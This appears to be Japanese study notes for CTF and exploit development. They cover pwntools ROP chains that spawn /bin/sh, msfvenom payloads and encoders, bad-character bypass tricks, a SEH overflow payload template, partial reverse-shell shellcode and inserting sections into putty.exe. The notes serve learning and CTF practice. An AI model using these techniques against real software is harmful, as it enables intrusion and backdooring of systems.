```
#### pwntools
##### 文字列操作
- `0x7fff1234 -> b '\x34\x12\xff\x7f'`   
```python
#python3のみ
# 文字列と結合しようとすると、
# TypeError: must be str, not bytes
val.to_bytes(int(byte),'little')
```   
```python
# python2 のみ
from pwn import *
r = remote("localhost", 4444)
p32(0x7fff1234) # '4\x12\xff\x7f'
p64(0x7fff1234) # '4\x12\xff\x7f\x00\x00\x00\x00'
payload  = "A" * 0x28 + p64(0x7fff1234)
r.send(payload)
```
- `\x34\x12\xff\x7f -> 0x7fff1234`   
```python
# python2 のみ
from pwn import *
hex(unpack('\xef\xbe\xad\xde')) # 0xdeadbeef
hex(u32('\xef\xbe\xad\xde'))  # 0xdeadbeef
hex(u64('\xef\xbe\xad\xde\x41\x42\x43\x45'))  # 0x45434241deadbeef
  
# python2,3 両方
import struct
print(hex(struct.unpack('<I',b'\x34\x12\xff\x7f')[0]))
```
- 0x7fffffff12345678(str) -> 0x7fffffff12345678(hex)
```python
lib_main_start_str = "0x7fffffff12345678"
hex(int(str(lib_main_start_str), 16))      # 0x7fffffff12345678
```
- `\`ruUUU -> 0x555555757260`   
```python
heap_addr = conn.recv(6)
hex(u64(heap_addr.ljust(8,b'\0'))) #0x555555757260
```
##### 通信関係
```txt
from pwn import *
conn = remote("localhost", 5000)

conn.sendafter("index: ", "-2")
conn.sendlineafter("ID: ", "admin")
libc_start_main = conn.recvline() #改行まで読み込み
conn.recvuntil('\n')

printf = conn.recv(6)      # 6を指定しないと余計なものまで読み込んでしまう
print("recv:" + printf)                  # recv:\x80\x8e\xa4�� (\x80\x8e\xa4\xf7\xff\x7f)
libc_printf = u64(printf.ljust(8,b'\0')) # libc_printf:0x7ffff7a48e80
                                         # u64(\x80\x8e\xa4\xf7\xff\x7f\x00\x00)

conn.interactive()
```
##### ELF解析
```txt
from pwn import *
context(os = "linux", arch = "amd64")
elf = ELF("./chall")
libc = ELF("./libc-2.27.so")

str(elf.got["malloc"]) #6295608
p64(elf.plt["printf"]) #\x90\x05@\x00\x00\x00\x00\x00
hex(elf.plt["printf"]) #0x400590
libc.symbols["__libc_start_main"] #137904
offset_libc_printf = libc.symbols["printf"] #137904
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_free_hook = libc.symbols['__free_hook']
offset_libc_system = libc.symbols['system']
addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

info('addr_libc_base    = 0x{:08x}'.format(libc_base))
```
##### Rop Chain
```txt
# puts(GOT_printf)でlibc leak

elf = ELF("./file")
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
print(rop.dump())
# 0x0000:         0x400873 pop rdi; ret             # return_addr
# 0x0008:         0x601020 [arg0] rdi = got.printf  # すでに一度呼ばれたprintf関数のGOT_addr
# 0x0010:         0x4005d0 puts                     # puts@plt
# 0x0018:         0x400782 main()                   # main関数の最初
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )

# system("/bin/sh")呼び出し

libc.address = libc_printf - libc.symbols.printf

rop = ROP(libc)
# rop.system(next(libc.search(b'/bin/sh'))) # スタックアラインメントの問題がある場合がある
# rop.raw(0x400874)                         # retでrspを8バイトずらす
rop.execv(next(libc.search(b'/bin/sh')),0 ) # systemがダメな時はexecv()を使う
print(rop.dump())
# 0x0000:   0x7ffff7a07e6a pop rsi; ret
# 0x0008:              0x0 [arg1] rsi = 0
# 0x0010:   0x7ffff7a0555f pop rdi; ret
# 0x0018:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
# 0x0020:   0x7ffff7ac8fa0 execv
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
```
#### metasploit
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000`   
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 336e4532`   
```txt
[1] EIPレジスタに入ってる値からOffsetを求めるときは、そのままの順でよい。
例) EIP = 41424344
なら、 -q 41424344 を実行すればよい

[2] スタック上の値を読んでOffsetを求めるときは以下のようにする(SEHなどの場合)。
例）
右下のスタック図
+00| 64 63 62 61 | abcd 
+04| 00 00 66 65 | ed..
+08| 44 43 42 41 | ABCD <- この位置のオフセットを知りたい！
+0c| 48 47 46 45 | EFGH

-q ABCD  もしくは、　-q 44434241  もしくは　-q 0x44434241  を実行する！(ASCIIの時は16進数と違って反転する)

この時、左下のメモリダンプはこんな感じ
+00| 61 62 63 64 65 66 00 00 | abcdef.. 
+08| 41 42 43 44 45 46 47 48 | ABCDEFGH

```
- `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw > calc.bin`   
200バイトくらい。   
- `python /opt/alpha3/ALPHA3.py x86 utf-16 uppercase eax --input="calc.bin"  --verbose`   
動作は以下の説明と同じ。   
1000バイトくらい。でかい。   
- `msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -e x86/unicode_upper BufferRegister=EAX -f py`   
500バイトくらい。   
シェルコード実行前にEAXにそのシェルコードの先頭アドレスを保存できている場合、`BufferRegister=EAX`を指定する。   
すると、シェルコードの実行してすぐの処理の、「現在位置をスタック上に保存することでデコーダの場所を特定する」処理が
必要なくなる！   
入力がunicodeに変換されるとき、上記のエンコーダーを使える。   

#### nasm
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb `   
```txt
nasm > jmp $+17
00000000  EB0F              jmp short 0x11 <- 相対アドレス。jmp命令のあるアドレス+0x11にjmpするということ
nasm > call $-0d
00000000  E8FBFFFFFF        call 0x0 <- リターンアドレスをセットしてjmpと同様に相対アドレスにjmp
nasm > jmp esp
00000000  FFE4              jmp esp

0xCC INT3       <- この命令を実行後ブレークする。Exploit書く時のデバッグに使える 
```
- `nasm -felf32 sample.asm`   
- `ld -m elf_i386 sample.o -o sample.out`   
- `for i in $(objdump -d sample.out |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo`   
- `python -c "print('\x74\x2b\x43')" > a.out; objdump -D -M intel a.out -b binary -m i386`   
```txt
global _start

section .text

_start:

;WINSOCK_API_LINKAGE SOCKET WSAAPI WSASocketA(
;  int                 af - 2, AF_INET (IPv4)
;  int                 type - 1, SOCK_STREAM (TCP)
;  int                 protocol - 6, IPPROTO_TCP (TCP)
;  LPWSAPROTOCOL_INFOA lpProtocolInfo - NULL,
;  GROUP               g - 0, No group operation
;  DWORD               dwFlags - 0 No flags
;);

; Create the socket with WSASocketA()

xor eax,eax
push eax        ; dwFlags 0
push eax        ; group
push eax        ; ProtocolInfo
xor ebx,ebx    
mov bl,6
push ebx        ; Protocol IPPROTO_TCP 6
```
##### bypass badcharacters
###### NULL bytes
```txt
nasm > mov eax,0x0
00000000  B800000000        mov eax,0x0   ; ダメ
-----------------------------------------------------
nasm > xor eax,eax
00000000  31C0              xor eax,eax   ; OK
```
```txt
nasm > MOV [EBP+0x80],Al
00000000  888580000000      mov [ebp+0x80],al  ; ダメ
------------------------------------------------------
nasm > add ebp,0x1
00000000  83C501            add ebp,byte +0x1
nasm > MOV [EBP+0x7f],Al
00000000  88457F            mov [ebp+0x7f],al  ; OK

nasm > MOV [EBP-0x80],Al
00000000  884580            mov [ebp-0x80],al  ; 負のオフセットならなおよし
nasm > MOV [EBP-0x81],Al
00000000  88857FFFFFFF      mov [ebp-0x81],al
```
```txt
nasm > mov eax,0x006e616c
00000000  B86C616E00        mov eax,0x6e616c   ; ダメ
------------------------------------------------------
nasm > mov ebx,0xffffffff
00000000  BBFFFFFFFF        mov ebx,0xffffffff
nasm > mov eax,0xff919e93
00000000  B8939E91FF        mov eax,0xff919e93 ; xorをあらかじめ計算しておいて逆算する
nasm > xor eax,ebx
00000000  31D8              xor eax,ebx
```
```txt
nasm > mov esi,eax
00000000  89C6              mov esi,eax    ; ダメじゃないけど2バイト必要
---------------------------------------------------
nasm > xchg eax,esi
00000000  96                xchg eax,esi   ; 2バイトが1バイトになった！
```
```txt
nasm > push dword 0x5c11
00000000  68115C0000        push dword 0x5c11 ; ダメ
-------------------------------------------------------
nasm > push word 0x5c11
00000000  6668115C          push word 0x5c11  ; OK
```
```txt
nasm > mov edx,0x646d63                        ; "cmd" 63 6D 64 -> 0x646d63
00000000  BA636D6400        mov edx,0x646d63   ; ダメ
---------------------------------------------------------
nasm > mov edx,0x646d6363
00000000  BA63636D64        mov edx,0x646d6363 ; "ccmd" 0x646d6363
nasm > shr edx,8
00000000  C1EA08            shr edx,byte 0x8   ; "cmd" 0x00646d63 右8ビットシフト(左は0埋め)
```
```txt
nasm > mov eax,0x100
00000000  B800010000        mov eax,0x100  ; ダメ
---------------------------------------------------------
nasm > xor eax,eax
00000000  31C0              xor eax,eax
nasm > inc eax
00000000  40                inc eax           ; 0x00000001
nasm > rol eax,8
00000000  C1C008            rol eax,byte 0x8  ; 0x00000100  2文字分左にローテーションさせる
```
```txt
0x0178f0ff -> 0x0178f000 に変換したい

nasm > shr edi,8
00000000  C1EF08            shr edi,byte 0x8 ; 0x000178f0 右ビットシフト(左はゼロ埋め)
nasm > shl edi,8
00000000  C1E708            shl edi,byte 0x8 ; 0x0178f000 左ビットシフト(右はゼロ埋め)
-------------------------------------------------------------
nasm > and edi,0xffffff01
00000000  81E701FFFFFF      and edi,0xffffff01  ; 下位２バイトを00にするためにANDをとる
nasm > and edi,0xffffff10
00000000  81E710FFFFFF      and edi,0xffffff10  ; これでも行けるけど、サイズがかなりでかい。美しくない
```
###### above 0x7f
```txt
nasm > add esp,0x32
00000000  83C432            add esp,byte +0x32   ; 0xc4が使えない
-------------------------------------------------------------
nasm > popad
00000000  61                popa        ; popadで32バイト分をpopすることでesp+32することができる！
```
##### short jmp
`0x21~0x7f`しか使えず、以下が使えないときは   
```txt
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > jmp eax
00000000  FFE0              jmp eax
nasm > call eax
00000000  FFD0              call eax
nasm > push esp
00000000  54                push esp
nasm > ret
00000000  C3                ret
```
`jae`とかのフラグの状態を伴う系の命令で代用できる！jmpする前のフラグレジスタの状態から使えそうなのを選ぶ。   
ここにもっとまとまっている表がある。   
https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/   
```txt
nasm > jae $+0x1
00000000  73FF              jnc 0x1
nasm > jne $+0x1
00000000  75FF              jnz 0x1
nasm > jnz $+0x1
00000000  75FF              jnz 0x1
nasm > jz $+0x1
00000000  74FF              jz 0x1
nasm > je $+0x1
00000000  74FF              jz 0x1
nasm > jae $-0x7e
00000000  7380              jnc 0xffffff82   ; 最大で0x7e(123bytes)分しかjmpbackできない
nasm > jae $-0x7f
00000000  0F837BFFFFFF      jnc near 0xffffff81
```
#### Windows周り
##### arwin
- `arwin`   
```txt
arwin.exe kernel32 CreateProcessA
arwin.exe ws2_32 WSASocketA
arwin.exe ws2_32 connect
arwin.exe kernel32.dll WinExec
arwin.exe user32 MessageBoxA
```
##### mona
https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/   
詳しい説明はここにある！以下をよく使う気がする。   
```txt
!mona modules
!mona find -s "¥xff¥xe4" -m slmfc.dll
!mona seh -m AIMP2.dll -cp unicode    # unicode用のアドレス形式のpop,pop,retを見つける (0x0045000eとか)
!mona seh -m zip4.exe -cp asciiprint
  ASCIIプリント可能な文字を含むアドレスだけを表示
!mona jmp -r esp
  -x X無しでも実行可能な命令だけを検索している
    - Number of pointers of type 'jmp esp' : 34
    - Number of pointers of type 'call esp' : 11
    - Number of pointers of type 'push esp # ret ' : 17
  として同等の命令も探してくれる！！
!mona egg -t w00t
  NtAccessCheck (AndAuditAlarm)のEgghunterを生成してくれる
!mona config -set workingfolder C:\logs\%p
  ファイルを生成するディレクトリを指定。%pでプロセス名のフォルダを作成してくれる。ファイルは上書きされる
!mona bytearray -b "\x00"
  baccharsを見つけるために0x00~9xffまでを生成する。.binと.txtが生成される
!mona compare -f bytearray.bin
　メモリ内に指定したファイルの内容があるかどうか調べる。badcharsの時に超便利！
!mona compare -f C:\logs\zip4\badchars.bin
  存在しないときはエラーになるっぽい？
!mona find -type asc -s "AAAA"
  メモリ内に文字列があるか検索する。便利
!mona stackpivot -distance 4,4
  スタックにEIPを移すような命令を列挙してくれる。distanceはよくわかってない…
!mona find -type instr -s "jmp ecx" -p2p 
  "jmp ecx"のポインタへのポインタを列挙する。(jmpのアドレスが値として存在するアドレスを列挙してくれる)
  0x77f953e4 : ptr to 0x7ce98007 (-> ptr to "jmp ecx")
!mona find -type instr -s "jmp esp" -x X
  Xで実行可能な命令を検索する。これがないと＊で検索してすごい量になる
  同等の命令は探してはくれない
!mona getpc -r eax
  eaxに現在のスタック上のアドレスを代入する一連の処理をいくつか挙げてくれる。デコード時に便利
  eax|  jmp short back:
  "\xeb\x03\x58\xff\xd0\xe8\xf8\xff\xff\xff"
  eax|  call + 4:
  "\xe8\xff\xff\xff\xff\xc3\x58"
  eax|  fstenv:
  "\xd9\xeb\x9b\xd9\x74\x24\xf4\x58"
  
   0:	eb 03                	jmp    0x5　; [1] objdumpではjmp 0x5は左の5:の番号に相対ジャンプすることを指す
   2:	58                   	pop    eax  ; [3] call時にスタックに保存したcall 0x2の次のアドレスをeaxに代入
   3:	ff d0                	call   eax  ; [4] call 0x2の次の命令に復帰。EAXにはその命令のアドレスがあり目標達成
   5:	e8 f8 ff ff ff       	call   0x2　; [2] 2:の処理(pop eax)にjmp。命令自体はcall $-0x3
!mona suggest
  pattcで作成した文字列をメモリに入れておくと、自動でよさそうなオフセットを計算してくれる
  Exploitの候補はRubyで作成される
            {
              'Ret'     =>  0x0040db2c, # pop eax # pop ebx # ret  - QuickZip.exe
              'Offset'  =>  294
            }
```
##### pvefindaddr
```txt
!pvefindaddr suggest
  pattcで作成した文字列をメモリに入れておくと、自動でよさそうなオフセットを計算してくれる
  Exploitの候補はPerlで作成される
 [+] Type of exploit : SEH (SE Handler is overwritten)
     Offset to next SEH : 294
     Offset to SE Handler : 298
 [+] Payload suggestion (perl) :
     my $junk="\x41" x 294;
     my $nseh="\xeb\x06\x90\x90";
     my $seh= XXXXXXXX;  #pop pop ret - use !pvefindaddr p -n    to find a suitable address
     my $nops="\x90" x 24;
     my $shellcode="<your shellcode here>";
     my $payload = $junk.$nseh.$seh.$nops.$shellcode;

```
#### PE-fileformat
PEViewで見るとこんな感じ。   
![image](https://user-images.githubusercontent.com/56021519/86029068-a7583980-ba6d-11ea-999e-c5bd7c64f317.png)   
LordPEで見るとこんな感じ。   
![image](https://user-images.githubusercontent.com/56021519/86028868-68c27f00-ba6d-11ea-8463-2e2e4f868146.png)   
RVAはVoffsetと同じこと。ローダーにロードされるときに配置される実際の相対アドレスを表す。   
Pointer to Raw DataはRoffsetと同じことで、ロードされる前のPEファイルの実際のアドレスを表す。   
Size of Raw DataはRsizeのことで、ロードされる前のPEファイルの実際のそのセクションのサイズ。    
Virtual SizeはVSizeと同じで、ロード後にそのセクションに割り振られるアドレスのサイズ。   
つまり、例えば.dataセクションに`0xAA*0x100`のデータしかなくてSize of Raw Dataが0x100の時、Virtual Sizeを0x1000としてロードすると、`0xAA*0x100`のデータと残りの0xf00の0x00埋めされたデータをの合計0x1000サイズが確保される。   
##### 新しいセクションの作成
LordPEで右クリックでセクションを追加して、`.NewSec,.1111`を追加する。   
`.Newsec`はCertification Tableの分のデータ分に配置しておく。こうしないと、`putty.exe`の後半に文字列を追加しても配置されるときにそこまで読み込まずに、手前にあるCertification Tableを読み込んでしまう。   
Certification Tableは通常時にはローダーには読み込まれない！   
![image](https://user-images.githubusercontent.com/56021519/86029171-c951bc00-ba6d-11ea-8df2-168bf1e1efc5.png)   
`.Newsec`でCertification Tableの分のデータ分に配置して、本当に配置したいデータはそのあとの`.1111`セクションで配置することにする。そのために`.NewSec`のRsizeを調整する。   
これで、`.1111`セクションが0x0010BA00から開始されるようになり、0xAA0xAA...を`.1111`セクションに配置できるようになる。   
![image](https://user-images.githubusercontent.com/56021519/86029715-7af0ed00-ba6e-11ea-8af4-78b15f06581c.png)   
putty.exeを起動して、Immunity DebuggerでAttachしてモジュールを一覧表示すると以下のようになる。   

![image](https://user-images.githubusercontent.com/56021519/86029539-3ebd8c80-ba6e-11ea-9e5a-8f27b88d5958.png)   
`.1111`セクションで`0xAA*0x100+0xBB*0x100`の合計0x200バイトと残りの0x00埋めの0xe00バイトが配置されている。   
これは、RSize0x100,VSize0x1000としたため、不足分は0x00埋めされたためである。   
0x100バイト分は追加されているが、なんでだ？？よくわからん。   
![image](https://user-images.githubusercontent.com/56021519/86029983-d7eca300-ba6e-11ea-9641-4bc7fa5e6e7f.png)   

##### 文字列参照
`.text`セクションで、`.rdata`セクションの文字列に参照するとき、以下のようになる。   
```txt
688eb14a00    push 0x4ab18e    ASCII "login as: "
```
![image](https://user-images.githubusercontent.com/56021519/86098831-a2d56480-baf1-11ea-8fc0-6b09c630e01c.png)   
この命令をロード後にImmunity Debuggerで確認すると、以下のようにアドレスが`0x4ab18e -> 0x013EB18E`に変換されている。   
![image](https://user-images.githubusercontent.com/56021519/86098923-be406f80-baf1-11ea-9e75-a96c2db4583b.png)   
これは、ImageBaseを考慮して再配置した結果である。   

`0x4ab18e`というアドレスは、デフォルトのEXEファイルのImageBaseである`0x400000`を前提としたアドレスである。つまり、Offsetは`0x0ab18e`であり、それにImageBaseの`0x400000`が加算されて、ロード後にこの文字列は`0x4ab18e`に配置されることになる、ということを前提としている。   

しかし、実際はASLRが有効であり、必ずしもImageBaseの`0x400000`に配置されるわけではない(というか、0x40000には配置されないはず)。   
今回の場合は、ASLRが有効なため`0x400000`ではなく`0x1340000`がImageBaseとなっている。   
![image](https://user-images.githubusercontent.com/56021519/86099593-aae1d400-baf2-11ea-8b8e-28e2e08ce7be.png)   
そのため、想定していた`0x400000`ではないため、その分のずれを修正する必要がある。   
```txt
実際に配置されるアドレス = (PEfileに書かれているアドレス - PEfileに書かれているImageBase) + 実際のImageBase
0x013eb18e = (0x4ab18e - 0x400000) + 0x1340000

```
ちなみに、`0x0ab18e`の相対オフセットはロード後に有効であり、ロード前のPEfileでは何の意味も持たない無効なオフセットであることに注意。   
##### ベース再配置情報
上記のように、想定していたImageBase(0x400000)が使われなかった場合、普通はRVA(相対オフセット)でアドレスを記述しているので、単に(ImageBase+RVA)でたとえImageBaseが想定のものでなくてもアドレスが計算できる。   

しかし、プログラム上でアドレスを指定した場合、そのアドレスはRVAで表現されず、想定していたImageBaseが足されたアドレスで表現される。   
例えば上記の例のように、本来は`0xab18e`として、`0xab18e + ImageBase`とすればいいところを、`0x4ab18e(0xab18e + 0x400000)`となっているため、`0x013eb18e = (0x4ab18e - 0x400000) + 0x1340000`という計算をしなければいけなくなっていた。   

このように再計算しなければいけないデータは、`.reloc`セクションの`IMAGE_BASE_RELOCATION`にオフセットが一覧で格納されている。   
![image](https://user-images.githubusercontent.com/56021519/86111566-de782a80-bb01-11ea-8224-094b8547a999.png)   
![image](https://user-images.githubusercontent.com/56021519/86111719-11222300-bb02-11ea-9ae6-2aa564cbab10.png)   
例えば、以下の例の時を考えるとその通りになっていることがわかる。   
```txt
>>> IB = 0x1170000        # 実際のImageBase
>>> s1_addr = 0x011925b7  # 下線のあるpush命令。pushするアドレスに下線があり、再配置情報を表す
>>> s2_addr = 0x01192604　# 下線のあるpush命令。pushするアドレスに下線があり、再配置情報を表す
>>> s3_addr = 0x0119261a　# 下線のあるpush命令。pushするアドレスに下線があり、再配置情報を表す
>>> hex(s1_addr - IB)　   # push命令からImageBaseを引いたもの。これに1を足すとpushするアドレスのオフセットになる
'0x225b7'                 # これはIMAGE_BASE_RELOCATIONの000225b8と対応している
>>> hex(s2_addr - IB)
'0x22604'                 # これはIMAGE_BASE_RELOCATIONの00022605と対応している
>>> hex(s3_addr - IB)
'0x2261a'                 # これはIMAGE_BASE_RELOCATIONの0002261bと対応している
```
![image](https://user-images.githubusercontent.com/56021519/86111759-1da67b80-bb02-11ea-8132-e8b0afbd6e1d.png)   
![image](https://user-images.githubusercontent.com/56021519/86112321-c8b73500-bb02-11ea-89a6-e5b310bf29c4.png)   

#### alarmのbypass
`hexedit`でバイナリを書き換える。   
`[Ctrl]+x`で保存   
`[Ctrl]+c`で保存しない   
`/`で検索。`e8 9f fe ff ff`で検索する。`[Tab]`で切り替え   
```txt
  400867:	bf 3c 00 00 00       	mov    edi,0x3c           <- bf ff ff 00 00 に書き換えてもよい
  40086c:	e8 9f fe ff ff       	call   400710 <alarm@plt> <- 90 90 90 90 90 に書き換えてalarmを無視
```
#### Cの関数
```txt
---------------------------------------------------------------------
setbuf

#include <stdio.h>
void setbuf(FILE *, char *buffer);

buffer 引数が NULL の場合、stream はバッファーに入れられません。
そうでない場合、buffer は、長さが BUFSIZ の文字配列を指している必要があります

int init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    return 0;
}
バッファを経由するかどうか？NULLの場合はバッファを経由しない？

---------------------------------------------------------------------
gets

        char    buff[100];
        gets(buff);
        
文字列が何文字読み込まれるか分からないので、BOFの脆弱性がある。
gets関数は改行かEOFまでの文字列をNUL文字も含めて読み込む

----------------------------------------------------------------------
strcpy

#include <string.h>
char *strcpy(char *s1, const char *s2);

文字型配列 *s1 に文字列 *s2 を '\0' までコピー。
'\0' もコピーする。BOFを起こしやすい危険な関数

```
## 参考文献
### Heap
http://kyuri.hatenablog.jp/entry/2017/04/21/152626   
マジで神！free,malloc,unlink時の動作がコードでかいてある。   
  
https://www.valinux.co.jp/technologylibrary/document/linux/malloc0001/   
Heapの動作が日本語でわかりやすく書いてある。   
  
https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/   
tcacheのWiki    
  
https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn    
Pwnの全体像がわかる。   

https://shift-crops.hatenablog.com/entry/2020/05/24/211147#ChildHeap-Pwn-473pt-7-solves   
ctf4bのchildheapの解説が神。わかりやすいし神。   

### SEH overflow
https://resources.infosecinstitute.com/seh-exploit/#gref   
Exploitの具体的な手順が書いてある。わかりやすい   
https://www.ffri.jp/assets/files/research/research_papers/SEH_Overwrite.pdf   
原理が書いてある。わかりやすい   
http://inaz2.hatenablog.com/entry/2015/07/13/011758   
原理が書いてある。わかりやすい   
https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/   
Exploitの手順が書いてある。これもわかりやすい   

### Egg-Hunting
https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/   
かなり詳細に書いてある。わかりやすい。   
https://resources.infosecinstitute.com/buffer-overflow-vulnserver/   
vulnserver.exeのEgg-HuntingのExploitが丁寧に書いてある。   

### Unicode-encoding
https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/   
超絶親切でわかりやすい。例が二つもある。うち一つは環境が構築できなかった…   
https://medium.com/@iphelix/corelan-tutorial-7-exercise-solution-8ee8eaedf36f   
上のExploitの例の別の解説。こっちもわかりやすい。   
https://github.com/TaQini/alpha3   
Unicode対応のエンコーダー。   
https://www.freebuf.com/articles/system/232280.html   
alpha3の使い方が書いてある。   
https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf   
ASCIIからUnicodeへの変換テーブル。   

### staged-shellcoding
https://werebug.com/exploit/vulnserver/2019/11/19/vulnserver-kstet-exploit-with-staged-payload-using-ws2-32-recv.html   
vulnerver.exeのstaged-shellcodingの解説。わかりやすい。   
https://deceiveyour.team/2018/10/15/vulnserver-kstet-ws2_32-recv-function-re-use/   
vulnerver.exeのstaged-shellcodingの解説。わかりやすい。   

### fuzzing (SPIKE)
https://resources.infosecinstitute.com/intro-to-fuzzing/   
めちゃくちゃ丁寧に書いてある。結構詳しい。Part1.   
https://resources.infosecinstitute.com/fuzzer-automation-with-spike/   
Part2。vulnserver.exeのautofuzzについて書かれている。   
https://null-byte.wonderhowto.com/how-to/hack-like-pro-build-your-own-exploits-part-3-fuzzing-with-spike-find-overflows-0162789/   
同じ内容の違う説明。   
https://tekwizz123.blogspot.com/2014/10/finding-new-vulns-with-fuzzing-and.html   
kolibri httpserverのファジングの説明とかがかなり丁寧に書いてある。   
https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE/src   
SPIKEのソースコード。   

### PE-fileformat
https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/   
putty.exeにバックドアを仕込む手順が書いてある。   
https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html   
図があってわかりやすい。   
http://sector876.blogspot.com/2013/03/backdooring-pe-files-part-2.html   
これもバックドアを仕込む手順が書いてある。   
https://blog.kowalczyk.info/articles/pefileformat.html   
PEの説明。   
https://tech-zealots.com/malware-analysis/pe-portable-executable-structure-malware-analysis-part-2/   
PEの説明。   
http://hp.vector.co.jp/authors/VA050396/tech_11.html   
再配置情報について書いてある。   

